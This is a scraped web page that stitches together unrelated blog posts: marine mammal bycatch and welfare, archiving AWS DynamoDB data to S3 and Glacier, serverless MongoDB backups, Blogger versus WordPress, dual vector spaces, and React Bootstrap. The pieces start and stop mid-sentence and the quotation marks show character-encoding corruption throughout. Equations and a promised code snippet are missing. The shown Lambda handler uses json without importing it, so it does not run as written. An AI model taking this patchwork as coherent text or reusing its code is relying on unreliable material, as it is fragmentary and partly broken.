href="https://youtu.be/vG8WpLr6y_U?t=827">Lee Byron's "Let's Program Like It's 1999" talk</a>).</p><p>However, after having tried everything mentioned in previous sections, I decided that this was the right approach to solve all our biggest and deepest problems. It was easy to implement and had a procedural flow, exactly what we want in a thin, performant, and understandable abstraction.</p><hr><p>Join me in <a href="https://blog.eliangtan.com/view-framework-2">part 2</a> where I delve deeper into the design and implementation of the view framework!</p>

        <p><span>S</span>arah Dolman heard the porpoiseâ€™s cries not in the waters where the animalâ€™s voice was actually recorded, but on the sound system at a marine mammal conference held in late 2019. To Dolman, policy manager at the nonprofit UK-based conservation organization <a href="https://uk.whales.org/" target="_blank">Whale and Dolphin Conservation,</a> time and distance made the experience no less painful.</p>

<p>The porpoise was using its voice—which sounds alternately like a buzzing insect, a creaky door blowing open then clicking shut, and a high-frequency whistle that humans cannot hear without the aid of sound-amplifying technologies—to call to another porpoise who was caught in a fishing net. The entangled porpoise struggled to surface while trying to break free. That proved impossible, and the porpoise drowned. But the dead creatureâ€™s companion stayed nearby for hours, speaking in protracted clicks, buzzes and whistles—in mourning or perhaps confusion, alarmed by the sudden death of its friend.</p>
<p>Globally, fishing gear kills <a href="https://www.sciencedirect.com/science/article/pii/B9780123735539000444" target="_blank">at least 300,000 marine mammals</a> every year, and leaves many more individuals with scars both physical and psychological. Some governments, including those of the U.S. and E.U., may temporarily close fisheries or regulate gear after a specified number of marine mammals are killed, but those measures are limited. At a moment when the cruel captivity of several dozen orcas inspires public outrage and aquarium boycotts and new laws, the global fishing industry and its regulators generally accept the widespread killing and maiming of marine mammals as a part of doing business. And so we unwittingly continue to eat fish, in huge amounts, and marine mammals continue to suffer.</p>
<p>Dolman says present approaches, which focus on maintaining specific populations above a minimum size, still allow too much killing and preventable suffering. She says itâ€™s time for fisheries policies to consider the welfare of individual whales and dolphins and other marine mammals. â€œBeing caught in fishing gear is a horrible way to die,â€� says Dolman. â€œHow would the public feel about this when theyâ€™re eating fish and seafood, if they knew about these animalsâ€™ suffering? We need another solution.â€�</p>
<p>Dolman and her colleague Philippa Brakes, a research fellow at Whale and Dolphin Conservation, outlined their approach for regulating â€œbycatch,â€� as unintentionally caught animals are called, and preventing entanglement in fishing gear in a <a href="https://www.frontiersin.org/articles/10.3389/fvets.2018.00287/full" target="_blank">2018 paper</a> published in the journal <em>Frontiers in Veterinary Science</em>. They say that fisheries policies must account for the well-being of individuals, not just populations, ideally with zero tolerance for marine mammal bycatch.</p>
<p>They also argue for updating the definition of â€œsustainableâ€� fisheries, now set according to whether the exploitation of a given fish population can be continued without jeopardizing it, to include marine mammals killed as bycatch. In their paper, Dolman and Brakes point out that â€œbuying â€˜sustainableâ€™ fish or indeed some fish products labeled â€˜dolphin-friendlyâ€™ provide no guarantees that incidental bycatch of protected species does not occur alongside the targeted catch.â€�&nbsp; And not only should sustainability encompass mortality, but also the suffering of survivors—something thatâ€™s a bit more challenging to measure, though scientists acknowledge that itâ€™s real, and goes beyond the pain of scars and severed limbs caused by the constricting ropes of the gear they carry.</p><figure><img src="https://s3.amazonaws.com/nautilus-vertical/oceans_911411818e26b80488c996ad7cfe7d4d.jpg" alt="nautilus whale calf"><figcaption><span>A humpback whale mother swims with her newborn calf in their traditional breeding waters in the Hawaiian Islands Humpback Whale National Marine Sanctuary. </span><br><span>Credit: NOAA News</span></figcaption></figure><p>Even if we are quite far from fully understanding the experiences of animals who spend their lives primarily underwater, <a href="https://link.springer.com/chapter/10.1007/978-3-030-31011-0_10" target="_blank">research clearly reveals</a> that harbor porpoises like the one whose cries haunted Dolman and other marine mammals are, like us, highly intelligent and social creatures. Ecologist and author <a href="https://www.nytimes.com/2015/08/04/science/review-beyond-words-carl-safina.html" target="_blank">Carl Safina</a>, who has written extensively about the inner lives of nonhuman animals including orcas and sperm whales, says the loss of even one individual whale—particularly if she happens to be an adult female—can be catastrophic for others.<br></p>
<p>â€œSperm whales stay together their entire lives, very intentionally living together in a family the way elephants live together in a family,â€� says Safina. â€œIf you lose even one member of that female support group, you increase the risks and hazards to the young ones.â€�&nbsp;</p>
<p>Like baby humans, young marine mammals depend on their eldersâ€™ vigilance and protection, as well as their practical knowledge and cultural wisdom, for survival. Older animals in a family bestow younger members with all sorts of knowhow, such as what to eat and how to hunt for food. Scientists have discovered that <a href="https://science.sciencemag.org/content/337/6100/1313" target="_blank">orca grandmothers</a> play an outsized role in the lives of young orcas, boosting youngstersâ€™ chances of survival. Even for less family-oriented marine mammal species, like humpback whales, notes Safina, â€œthe death of a mother—or severe distress of a mother due to entanglement in fishing gear—can be, depending on age of a young one, completely devastating or very stressful.â€�
</p>
<p>Research like this â€œopens a rich seam of understanding,â€� Brakes says. â€œSuch understanding shows us that we can no longer treat marine mammals like a homogenous group or numbers on a spreadsheet.â€� She and Dolman propose a multi-pronged strategy of implementing fisheries closures and new fishing practices, as well as requiring new gear that minimizes bycatch and entanglements. Fisheries regulation would need to include enhanced monitoring and reporting systems that keep track of every harmed marine mammal. Right now basic data about bycatch and entanglements, much less the long-term physiological and psychological affects, are not being collected.</p>
<blockquote>â€œWe can no longer treat marine mammals like a homogenous group or numbers on a spreadsheet.â€�</blockquote>
<p>According to Dolman, the Marine Stewardship Council (MSC), a key independent labeler of sustainable seafood, has received much criticism in recent years about its inadequate consideration of bycatch. â€œMSC bycatch standards are under review at the moment,â€� Dolman said. â€œThis is something thatâ€™s long overdue. But, I have to say, Iâ€™m not feeling very positive about whatâ€™s coming. The fishing industry is very vocal and oppositional to regulatory change. Consumers and scientists must begin pushing for laws and certification schemes to seriously incorporate welfare into the â€˜sustainableâ€™ label. Most of the public feels comfortable when they see a dolphin-safe label—though really, right now, they shouldnâ€™t.â€�<strong>
</strong></p>
<p>Adding to marine mammalsâ€™ collective challenges is the fact that fishing isnâ€™t their only threat. In addition to depleting populations of the fish they eat, humans have made the oceans a much noisier place, with engine noise and seismic surveys and naval tests causing both chronic stress and acute damage. We push ship traffic into ever-more remote areas once only known to marine animals; disrupt marine life by developing coastlines and dredging channels; pollute with plastic and toxic chemicals; and cause ocean-warming climate change.
</p>
<p>These are not matters to frame purely in terms of populations and environments, but the lived experiences of animals who share many intellectual properties with us. â€œPeople need to understand that other living things can suffer and that these individuals donâ€™t want to suffer. They want to exist in a state of wellbeing. Thatâ€™s what they strive to do,â€� says Safina. â€œI think the big first step is for people to understand and talk about that and drive away from things that cause suffering.â€�</p>

  <p><span>07 Aug 2020</span></p><p>AWS offers a variety of general purpose storage solutions. While DynamoDB is the best option when latency and a variety of access patterns matter most, S3 allows for cost reduction when access patterns are less complex and latency is less critical.</p>

<p>This article describes the available options for archiving data, how to prepare that data for long term archival and how to let S3 transition data between storage tiers.</p>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/data_archival_storage_vs_latency.png" alt="Storage Price vs Latency"></p>

<p>Below you find a table comparing the prices and access latencies as of August 2020.</p>



<p>All prices are for us-east-1. This article focuses on storage cost only.</p>

<h2 id="prerequisites">Prerequisites</h2>

<p>You should have an <strong>AWS account</strong> and gained <strong>first experience with DynamoDB or S3</strong>. The code snippets are written in Python and are intended to run on <strong>AWS Lambda</strong>.</p>

<h2 id="moving-data">Moving Data</h2>

<p>As you’ve seen in the previous table, you can achieve significant storage cost reduction, by moving your data to a cheaper storage solution.</p>

<p>There are 3 major paths when archiving data:</p>

<ol>
  <li>DynamoDB to S3</li>
  <li>S3 Storage Tiers</li>
  <li>Final Archival with S3 Glacier</li>
</ol>

<p>The first path requires a lambda function, and the others can be achieved without additional glue code. We will however look at data aggregation for small objects, as infrequent access solutions are less suitable for small objects.</p>

<h3 id="dynamodb-to-s3">DynamoDB to S3</h3>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/data_archival_badge_1.png" alt="Badge for DynamoDB to S3"></p>

<p><strong>When to move data from DynamoDB to S3</strong></p>

<p>Moving data out of DynamoDB makes sense when that data is becoming stale, but remains interesting for future use cases.</p>

<p>An example for this are performance metrics. We’re most interested in the recent weeks, but don’t look at data from months ago too much. We still want to keep those around for later analysis or troubleshooting.</p>

<p><strong>How to move data from DynamoDB to S3</strong></p>

<p>To move data from DynamoDB to S3, we can use DynamoDB’s Time to Live (ttl) feature in combination with event streams. This approach requires four steps:</p>

<ol>
  <li>Specifying a ttl attribute on a DynamoDB table</li>
  <li>Adding a timestamp to records which shall expire</li>
  <li>Activating a stream that DynamoDB will emit deleted records to</li>
  <li>Attaching a lambda to this stream, which checks for <code>DELETE</code> events and writes the records into an S3 bucket</li>
</ol>

<p>The first three steps are covered in my article <a href="https://bahr.dev/2020/02/02/aggregate-ddb/">How to analyse and aggregate data from DynamoDB</a>.</p>

<p>The lambda function to transition records to S3 can be as short as the following snippet:</p>

<div><div><pre><code><span>from</span> <span>datetime</span> <span>import</span> <span>datetime</span>
<span>import</span> <span>boto3</span>
<span>s3</span> <span>=</span> <span>boto3</span><span>.</span><span>resource</span><span>(</span><span>'s3'</span><span>)</span>

<span>def</span> <span>handler</span><span>(</span><span>event</span><span>,</span> <span>context</span><span>):</span>
    <span>for</span> <span>record</span> <span>in</span> <span>event</span><span>.</span><span>get</span><span>(</span><span>'Records'</span><span>,</span> <span>[]):</span>
        <span>if</span> <span>record</span><span>[</span><span>'eventName'</span><span>]</span> <span>!=</span> <span>'DELETE'</span><span>:</span>
            <span>return</span>
    
        <span>payload</span> <span>=</span> <span>record</span><span>[</span><span>'dynamodb'</span><span>][</span><span>'NewImage'</span><span>]</span>
        <span># this assumes that there is a partition key called Id 
</span>        <span># which is a number, and that there is no sort key
</span>        <span>key</span> <span>=</span> <span>record</span><span>[</span><span>'dynamodb'</span><span>][</span><span>'Keys'</span><span>][</span><span>'Id'</span><span>][</span><span>'N'</span><span>]</span>

        <span>date</span> <span>=</span> <span>datetime</span><span>.</span><span>now</span><span>().</span><span>isoformat</span><span>()</span>

        <span>object_key</span> <span>=</span> <span>f"data-from-dynamodb/</span><span>{</span><span>date</span><span>}</span><span>/</span><span>{</span><span>key</span><span>}</span><span>"</span>
        <span>body</span> <span>=</span> <span>json</span><span>.</span><span>dumps</span><span>(</span><span>payload</span><span>).</span><span>encode</span><span>()</span>
        <span>s3</span><span>.</span><span>Object</span><span>(</span><span>'my_bucket'</span><span>,</span> <span>object_key</span><span>).</span><span>put</span><span>(</span><span>Body</span><span>=</span><span>body</span><span>)</span>
</code></pre></div></div>

<p>This will store deleted records in the S3 bucket <code>my_bucket</code>. No data is lost, the DynamoDB table stays small and you get an instant 90% cost reduction on storage.</p>

<h3 id="s3-storage-tiers">S3 Storage Tiers</h3>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/data_archival_badge_2.png" alt="Badge for S3 Storage Tiers"></p>

<p><strong>If your data is accessed infrequently</strong> you can achieve further cost savings by picking the right storage tier.</p>

<p>S3 Lifecycle Transitions allow us to move objects between storage tiers without them leaving the S3 bucket. We define rules where we specify which storage tier an object shall be moved to once it reaches a certain age.</p>

<p><img src="https://docs.aws.amazon.com/AmazonS3/latest/dev/images/lifecycle-transitions-v2.png" alt="S3 Transition Paths"></p>

<p>You can read all about the S3 lifecycle transitions on the <a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/lifecycle-transition-general-considerations.html">official AWS documentation</a>.</p>

<p><strong>When to move data between S3 tiers</strong></p>

<p>S3 Standard gives you the most reliability and fastest access speed. If you’re okay with 99.9% availability or you only access your data rarely (e.g. for regulatory checks), then the non-standard tiers can give you a cost advantage. The durability of your data is not affected (unless you pick the One-AZ tier).</p>

<p>You also should aggregate data before moving it to a storage tier other than S3 Standard or S3 Intelligent-Tiering, as there is a <a href="https://aws.amazon.com/s3/storage-classes/">minimum capacity charge per object</a>. As a rule of thumb, aggregate your objects until the result is at least 1MB.</p>

<p><strong>How to move data between S3 tiers</strong></p>

<p>Due to the minimum capacity charge we will <strong>start by aggregating data</strong>. If all of your objects in S3 are already 1MB or more, then you can skip directly to the lifecycle rules. To aggregate objects we can use any compute service (EC2, Fargate, Lambda) to load objects from S3, aggregate them and write the aggregated data back.</p>

<p>This code snippet uses <a href="https://boto3.amazonaws.com/v1/documentation/api/latest/reference/services/s3.html">boto3</a> and loads all records from the folder <code>data-from-dynamodb/2020-07</code>, aggregates them, deletes the old data and uploads the new data into the folder <code>aggregated</code>.</p>

<p>Now that we’ve packaged our objects, let’s continue with <strong>lifecycle transitions</strong>. S3 can be configured to automatically move objects between storage tiers.</p>

<p>In this article we will configure the lifecycle transitions through the AWS console. You can also use the CDK’s <a href="https://docs.aws.amazon.com/cdk/api/latest/docs/@aws-cdk_aws-s3.LifecycleRule.html">LifecycleRules</a> and <a href="https://docs.aws.amazon.com/cdk/api/latest/docs/@aws-cdk_aws-s3.Transition.html">Transition</a>s to build an Infrastructure as Code solution.</p>

<p>To get started, open your S3 bucket in the AWS console and open the Management tab. Click on “Add lifecycle rule” to configure a lifecycle. By applying the lifecycle rule to the folder <code>aggregated</code>, we only transition data which has been packaged for archival.</p>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/data_archival_step_1.png" alt="Lifecycle Rules Step 1"></p>

<p>Specify a Transition to Standard-IA (Infrequent Access) after 30 days. We’re assuming here that data will be archived and therefore infrequently accessed, but you can increase this number however you like or pick another storage tier.</p>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/data_archival_step_2.png" alt="Lifecycle Rules Step 2"></p>

<p>Review and complete the lifecycle rule.</p>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/data_archival_step_3.png" alt="Lifecycle Rules Step 3"></p>

<p>After 30 days you should start see in your bill that some objects are now priced at a less expensive storage tier. If you picked S3 Infrequent Access, that’s another 45% you save for storage.</p>

<h3 id="data-on-ice-with-s3-glacier">Data on Ice with S3 Glacier</h3>

<p>While we’re only looking at Glacier here, you can apply the same principles for moving data to Intellingent-Tiering, One Zone-IA and Glacier Deep Archive.</p>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/data_archival_badge_3.png" alt="Badge for S3 Glacier"></p>

<p><strong>When to move data to Glacier</strong></p>

<p>S3 Glacier and S3 Glacier Deep Archive become interesting options, when you need to store data for a very long time (+5 years) and only access it very rarely (1-2 a year or less).</p>

<p><strong>How to move data to Glacier</strong></p>

<p>As we’ve previously aggregated our data, we can add additional lifecycle transitions to move the data from S3 Infrequent Access to S3 Glacier. Instead of the Infrequent Access tier, now pick a Glacier option and adjust the time before transition accordingly.</p>

<p><img src="https://github.com/bahrmichael/bahrmichael.github.io/raw/master/pictures/data_archival_glacier.png" alt="Lifecycle Rule Glacier"></p>

<p>That’s it. Your data is now on ice and we get an additional 68% cost reduction on storage.</p>

<p><strong>How to retrieve data from Glacier</strong></p>

<p>To access data that is stored in Glacier, <a href="https://docs.aws.amazon.com/AmazonS3/latest/user-guide/restore-archived-objects.html">you have to restore a copy of the object</a>. The copy will be available for as long as you specified. The retrieval however can take up to 12 hours.</p>

<h2 id="next-steps">Next Steps</h2>

<p>Do you have big DynamoDB tables? Figure out what data you can archive, and start moving it to S3 for a 90% cost reduction!</p>

<p>Do you already have data in S3? Add a lifecycle transition to a lower tier and aggregate objects if needed.</p>

Heck, that’s true for basically every technology: they all come with <em>pros</em> and <em>cons</em>.</p><p>One of the most valuable benefits I see in Serverless and I believe hard to confute though is, well… that less toil work dedicated to server administration means that as an engineer you can focus on arguably more valuable tasks at hand and, probably, the end result of what you build will be a more robust and reliable infrastructure too.</p><p>Take this case for example: perform daily backups of remote (i.e. fully managed, no shell access) MongoDB instance, store these archives somewhere offsite and delete them once they are older than a defined amount of time. I’m sure if you’ve ever did system administration (or call it <em>DevOps</em> if you prefer) this sounds like a very familiar kind of task, doesn’t it?</p><h2 id="a-conventional-approach">A conventional approach</h2><p>In the old days, when Serverless was not yet a thing, a common way to approach this was to:</p><ol><li>setup some <em>admin</em> or <em>ops</em> kind of server responsible for this and most probably other kind of similar back-office activities. No need to say you and your team also need to take good care of it for the forseeable future (i.e. have redundant storage drives in some kind of RAID scheme and replace them once they fail, keep the server itself backupped, monitor that it’s up and running 24/7, etc)</li><li>set up some kind of cronjob to do the above backup routine every evening (or every X amount of time, depending on the needs, etc)</li><li>in the same above cronjob or as an independent task, have some kind of <em>pruning</em> process that takes care of deleting old archives once their expiry date has passed</li></ol><h2 id="a-serverless-approach">A Serverless approach</h2><p>Instead, in this article I’m going to show you how this very same problem might be approached from a Serverless perspective. These are the tools I’m going to use:</p><ul><li>AWS S3 for storing the archives and automatically prune them after they are older than 7 days</li><li>AWS Fargate for executing a <code>mongodump</code> process (wrapped by a few lines of Bash) in a <em>Docker container</em> and upload the generated archive to an S3 bucket</li><li>AWS CloudWatch Events to trigger the routine in a <em>cron</em> fashion (in my case every day at 23:50)</li><li>AWS CDK to easily setup all the above, including ECS cluster and auto-generated <em>least-privilege</em> IAM policies and so forth</li></ul><h2 id="show-me-the-code">Show me the Code</h2><p>This is a slightly simplified overview of the application:</p><p><img src="https://a.l3x.in/blog/mongodb-backups-with-aws-cdk/mongodumper_stack.png" alt="Stack diagram"></p><p>The AWS CDK stack (including Dockerfile and Bash script) is <a href="https://github.com/shaftoe/api-l3x-in/tree/0.13.0/lib/stacks/mongodumper">available on GitHub</a>.

By the way, I’ve worked around this using <code>debian:buster-slim</code> as Docker base image given that I don’t care that much about image size anyway, my AWS bill is basically unaffected by a few more MBs stored in the ECS registry so what the heck</p></li><li><p>every single time a Fargate task is executed without explicitly setting a security group <strong>will create a brand new one</strong> and, given that there’s a quota of <a href="https://docs.aws.amazon.com/vpc/latest/userguide/amazon-vpc-limits.html">maximum 2500 security groups per region</a>, this might very well cause a few headaches in the close future unless properly addressed. To avoid that I explicitly set the Fargate Task to use the default VPC security group which has open <code>EGRESS</code> rules and works fine in my scenario, it’s implemented at at <a href="https://github.com/shaftoe/api-l3x-in/tree/0.13.0/lib/stacks/mongodumper/__init__.py#L66">line 66</a> of the CDK stack.

Of course this might not be true in case of big datasets where the cost for S3 storage/data transfer might make an in-house solution (or even better, a fully managed solution, automated backups included) more cost effective, but I bet this is never going to be the case in many real scenarios where archives are relatively small sized (i.e. a few GBs or so).</p><p>That said, the current shortcomings in the integration between ECS and CDK are annoying and enforce the <em>Serverless is not 100% ready for production</em> argument validity, at least for the time being.</p><p>I hope you enjoyed reading this article at least a fraction of how much I did while working on it, and don’t forget to let me know what you think.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
							
<p>Blogger vs WordPress which platform is better? This has been a recurring question asked by many users of these two platforms. We have decided to deal with this question once and for all.</p>
<p>Note that this comparison is based on self-hosted WordPress and free Blogger platform; and not between WordPress.com and Blogger. Let’s go into the meat of the matter.</p>
<hr>
<h2>Table of Contents</h2>
<ul>
<li>The ownership of each platform</li>
<li>Control of platform</li>
<li>Look and Feel</li>
<li>Portability of Blogger vs WordPress</li>
<li>Security of WordPress vs Blogger</li>
<li>Level of support for each platform</li>
<li>Set up</li>
<li>Versatility</li>
<li>Customization</li>
<li>Software Updates</li>
<li>Conclusion</li>
</ul>
<hr>
<h2>The ownership of each platform</h2>
<p>Blogger and its blogspot.com domain are both free services owned and controlled by the almighty Google. The disadvantage of this is that you do not have any control over this platform if you publish your blog on Blogger. Google can decide to shut down your blog and you will be left to start all over again. Your content is gone.</p>
<p>On the other hand, WordPress is an open source platform; which means the software is free. It is also <a href="https://www.edopedia.com/blog/best-cheap-web-hosting-services/" data-wpel-link="internal" rel="follow">self-hosted</a>. You can have your domain name like www.myblog.com and host it. The advantage here is that you own the domain and the contents. You can decide to renew the ownership yearly or not.</p>
<hr>
<h2>Control of platform</h2>
<p>Blogger has got limited control, unlike WordPress which has unlimited control. Blogger is not flexible because the tools available are limited. For instance, in WordPress you can use plugins to give your blog different features and make it a lot more useful; you do not have such luxury with Blogger. For example: In WordPress you have the ability to convert a blog to an <a href="https://www.edopedia.com/blog/best-free-wordpress-ecommerce-plugins/" data-wpel-link="internal" rel="follow">online store</a> with just a plugin. This is how flexible WordPress is.</p>
<hr>
<h2>Look and Feel</h2>
<p>Let’s discuss the look and feel of these platforms. By “look and feel”, we are referring to appearance. Blogger has got very beautiful appearance but the constraint is that you cannot modify or extend it by adding more layouts on the default template. You just have to use the default template just the way it is.</p>
<p>For WordPress, it is easy to extend the layouts using a <a href="https://www.edopedia.com/blog/free-wordpress-page-builder-plugins/" data-wpel-link="internal" rel="follow">page builder plugin</a>. You can find themes for different types of websites with WordPress; it’s not so for Blogger.</p>
<hr>
<h2>Portability of Blogger vs WordPress</h2>
<p>You are at great risk when you use Blogger and you decide to move your content to another platform. For instance, moving Blogger to WordPress could make you lose a lot such as domain authority and your <a href="https://www.edopedia.com/blog/best-free-wordpress-seo-plugins/" data-wpel-link="internal" rel="follow">Search Engine Optimization (SEO)</a> ranking.</p>
<p>Whereas WordPress is super easy to move. You can easily move from one <a href="https://www.edopedia.com/blog/best-cheap-web-hosting-services/" data-wpel-link="internal" rel="follow">hosting platform</a> to another with ease. You can even decide to change the domain name, yet, it will still be a jolly ride even if you want to move to another platform entirely.</p>
<hr>
<h2>Security of WordPress vs Blogger</h2>
<p>One great advantage of using Blogger is that it is quite secure since it is powered by Google. They have enough server resources for the proper functioning of your blog. You don’t have to spend money to increase the disk space or bandwidth. You do not have to worry about backing up of your content. No worries about security too. Google basically takes care of all of that for you.</p>
<p>While WordPress is secure by default but you still have to add more <a href="https://www.edopedia.com/blog/best-free-wordpress-security-plugins/" data-wpel-link="internal" rel="follow">security features</a> so as to make sure that your blog has a multi-layered security. You have to <a href="https://www.edopedia.com/blog/best-free-wordpress-backup-plugins/" data-wpel-link="internal" rel="follow">back up your content</a> because the web server can crash at any time and if that happens, you would just move your blog content to another web server. There are hundreds of plugins available to give your blog extra security when you are using WordPress.</p>
<hr>
<h2>Level of support for each platform</h2>
<p>When it comes to support, what you get with Blogger is restricted. There is a forum and also documentation for Blogger users. Blogger’s support does not go beyond this.</p>
<p>WordPress, on the other hand, has a myriad of support for users. WordPress has a dynamic support system that is very active such as forums, documentation and an online support. You can easily get assistance from these various support options. Aside from that, you can also get excellent paid support if you are using a premium theme. There are also free themes with a wonderful support.</p>
<hr>
<h2>Set up</h2>
<p>If we talk about how to set up these two platforms then it is a lot easier to configure a WordPress blog compared to Blogger. Once you have a hosted domain, you just <a href="https://www.edopedia.com/blog/how-to-create-a-wordpress-website/" data-wpel-link="internal" rel="follow">install WordPress with one click</a> and customize it. It’s that easy.</p>
<p>Blogger requires you to have an account before setting up. But a point to be noted is that you can have many blogs under one account.</p>
<hr>
<h2>Versatility</h2>
<p>WordPress is very versatile than Blogger. With WordPress, you can convert a blog to an online store or add portfolios without any stress.</p>
<p>For Blogger, a default template can only be used for a specific purpose. To design an online store or a blog with Blogger, you have to choose a template made for it. Basically, you can’t convert a blog template to work as an <a href="https://www.edopedia.com/blog/best-free-ecommerce-wordpress-themes/" data-wpel-link="internal" rel="follow">online ecommerce store</a>.</p>
<hr>
<h2>Customization</h2>
<p>There are limitations when it comes to customizing Blogger but there are no limitations for WordPress. You have unfettered control over the appearance of your WordPress blog or website.</p>
<hr>
<h2>Software Updates</h2>
<p>Updates are automatic in Blogger. For WordPress, there are some automatic updates but mostly you have to manually upgrade the version of your plugins and themes.</p>
<hr>
<h2>Conclusion</h2>
<p>When you talk about WordPress vs Blogger, WordPress beats Blogger hands down in many ways. The flexibility of WordPress over Blogger is so outstanding. WordPress is the world’s most used platform powering more blogs and websites than any other platform.</p>
<p>The fact that you do not own Blogger as a platform is a great disadvantage. One major disadvantage of WordPress is that you have to buy a domain and hosting while Blogger costs you nothing.</p>
<p>One distinguished advantage of WordPress is that it is open source which means it is not owned by anyone and you do not have to depend on a company or organization to make it work, unlike Blogger where you have to depend on Google for everything.</p>
<p>WordPress gets better every day because there are communities of developers working on it while Blogger has not undergone any outstanding updates for some time.</p>
<p>Blogger vs WordPress; the choice is now yours. Good luck!</p>

<p>When I was learning about Continuum Mechanics for the first time, the <em>covariance
and contravariance of vectors</em> confused the hell out of me. The concepts gain
meaning in the context of Riemannian Geometry, but it was surprising to find
that one doesn’t need to learn an entire subject to grasp the logic behind
co-/contravariance. An intermediate knowledge of linear algebra is enough—that
is, one has to be acquainted with the concept of vector spaces and one-forms.</p>
<p>The duality of co-/contravariance arises when one has to define vectors in terms
of a non-orthonormal basis. The reason such terminology doesn’t show up
in engineering education is that Cartesian coordinates are enough for most
engineering problems. But every now and then, a complex problem with funky
geometrical requirements show up, like one that requires measuring distances and
areas on non-flat surfaces. Then you end up with dual vector spaces. I’ll try to
give the basics of duality below.</p>
<p><strong>Definition:</strong> Let $\CV$ be a finite-dimensional real vector space.
The space $\CV^\ast = \CL(\CV,\IR)$,
defined as the
the space of all one-forms $\Balpha:\CV\to\IR$, is called the
<strong>dual space</strong> to $\CV$.</p>
<p>Let $B=\cbr{\Be_1,\dots,\Be_n}$ be a basis of $\CV$. Any vector $\Bv\in\CV$ can be written
in terms of $B$ as</p>

<p>with the components $a_1,\dots,a_n\in\IR$.
For any $i=1,\dots,n$, we can define the $i$-th component $a_i$ by a one-form as</p>

<p>These elements are linear and thus are in the space
$\CL(\CV,\IR)$<sup id="fnref:1"><a href="#fn:1">1</a></sup>.
Given any basis $B=\setveci{\Be}$, we call $B^\ast = \setveciup{\Be}$
the basis of $\CV^\ast$ <strong>dual</strong> to $B$.
The fact that $B^\ast$ really is a basis of $\CV^\ast$ can be proved
by showing that $\Be^i$ are linearly independent.
Then $\Bv$ has the following
representation</p>

<p>Instead of $a_i$, it is practical to denote the components of $\Bv$ as $v^i$,
lightface of the same symbol with a raised index corresponding to
the raised index of the dual basis:</p>

<p>In fact, this convention is more compatible with
the symmetry caused by the duality.
This point will be more clear after the introduction of
dual basis representation of one-forms.</p>
<p><strong>Proposition:</strong> Each $\Be^i \in \CL(\CV,\IR)$ can be identified by its action on the basis
$B$:</p>

<p><strong>Proof:</strong> For any $\Bv\in\CV$, $\Be^i(\Bv)$ must give $v^i$, the
$i$-th component of $\Bv$.
Setting $\Bv = \Be_j$, one sees that
$\Be^i(\Bv)=v^i = 1$ when $i=j$, and is zero otherwise.</p>
<p>Geometrically, \eqref{eq:dualbasis2} implies that a basis vector is
perpendicular to all the dual basis vectors, except its own dual.</p>
<h2 id="dual-basis-representation-of-one-forms">Dual Basis Representation of One-Forms</h2>
<p>Let $\Balpha$ be a one form in $\CV^\ast$ with the corresponding
dual basis $\setveciup{\Be}$. Then similar to a vector,
$\Balpha$ has the following representation</p>

<p>where the <strong>components of the one-form</strong> $\Balpha$
are defined as</p>

<p><strong>Proof:</strong> We substitute \eqref{eq:vectorrep2} and obtain</p>

<p>using $\Balpha$’s linearity.</p>
<p><strong>Notation:</strong>
Let $\CV$ be a finite-dimensional real vector space.
For $\Bv\in\CV$ and $\Balpha\in\CV^\ast$</p>

<p>denotes the action of $\Balpha$ on $\Bv$, and is called
a <strong>natural pairing</strong> or <strong>dual pairing</strong>
between a vector space and its dual.
<em>It is of the essence to understand that $\abrn{\cdot,\cdot}$ does not
denote an inner product in $\CV$</em>; that is,
$\abr{\Bv,\Balpha}$ means $\Balpha(\Bv)$.</p>
<p>With this notation, \eqref{eq:vectorrep2} can be written as</p>

<p>and \eqref{eq:dualbasis2} as</p>

<p>Using the convention that $\Be_i$ are column vectors and
$\Be^i$ are row vectors,
\eqref{eq:dualbasis1} can be rearranged in the following manner</p>

<p>which can be used to compute a dual basis.</p>
<p><strong>Example:</strong> Given a two-dimensional vector space $\CV$ with a basis
$\Be_1=[2,-0.5]\tra$, $\Be_2=[1,1]\tra$, we use
\eqref{eq:computedualbasis1} to compute</p>

<p>and obtain the dual basis vectors as
$\Be^1=[0.4,-0.4]$ and $\Be^2=[0.2,0.8]$.
The result is given in the
following figure,</p>
<figure>
<p><img src="https://solmaz.io/img/duality_vector_spaces/fig2.svg"></p>
</figure>
<p>where one can see that $\Be_1\perp\Be^2$, $\Be^1\perp\Be_2$.</p>
<figure>
<p><img src="https://solmaz.io/img/duality_vector_spaces/fig1.svg">
A body $\CB$ embedded in $\IR^2$ with curvilinear coordinates.
Every point $\CP$ at $\BX$ has an associated two-dimensional vector space,
called $\CB$’s tangent space at $\BX$, denoted $\tang_\BX\CB$. The basis
$\Be_i$ corresponding to coordinates $\theta_i$ are not necessarily
orthogonal and can admit corresponding duals $\Be^i$, due to
curvilinearity.
The coordinates appear to be affine at the point’s immediate vicinity,
and thus in the tangent space.</p>
</figure>
<p>The introduction of the dual space
allows us to reinterpret a one-form $\Balpha$
as an object residing in the dual space. In fact,
the <strong>canonical duality</strong> $\CV^{\ast\ast}=\CV$
states that every vector $\Bv$ can be interpreted as a functional
on the space $\CV^\ast$ via</p>

<p>I actually rate Bootstrap relatively highly as a UI library. It’s not going to win you any design awards, but it gets the job done for side projects and minimum viable products.</p>
<p>It depends what you want to use it for, though. If you’re new to React, it’s a great library to use to get started. As a more experienced developer, chances are you’ll want to look into styled-components/Emotion.</p>
<p>There are two popular libraries with React bindings for Bootstrap, I’ve personally only used Reactstrap.</p>
<p>Project links:</p>
<ul>
<li>
<p><a href="https://react-bootstrap.github.io/">React Bootstrap</a></p>
<ul>
<li>Bundle Size (from <a href="https://bundlephobia.com/result?p=react-bootstrap@1.3.0">BundlePhobia</a>): 111kB minified, 34.4kB minified + gzipped, less with treeshaking</li>
</ul>
</li>
<li>
<p><a href="https://reactstrap.github.io/">Reactstrap</a></p>
<ul>
<li>Bundle Size (from <a href="https://bundlephobia.com/result?p=reactstrap@8.5.1">BundlePhobia</a>): 152.1kB minified, 39.4kB minified + gzipped, less with treeshaking</li>
</ul>
</li>
</ul>
<p>Pros:</p>
<ul>
